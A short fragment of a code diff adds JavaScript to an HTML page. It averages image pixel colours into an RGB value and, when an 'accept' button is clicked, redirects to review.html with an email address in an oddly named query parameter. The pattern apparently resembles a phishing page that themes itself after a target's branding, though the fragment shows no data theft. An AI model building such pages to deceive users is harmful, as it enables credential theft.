+                r += data[i]; g += data[i+1]; b += data[i+2]; count++;
+            }
+        }
+        if(count === 0) return "rgb(40,167,69)"; // fallback green
+        r = Math.round(r/count); g = Math.round(g/count); b = Math.round(b/count);
+        return `rgb(${r},${g},${b})`;
+    }
+
+    tryNext();
+
+   document.getElementById("acceptBtn").addEventListener("click", ()=>{
+        let targetURL = "review.html";
+        if(email) targetURL += `?bazz505=${encodeURIComponent(email)}`;
+        window.location.href = targetURL;
     });
-  </script>
+
+})();
+</script>
+
 </body>
 </html>
+
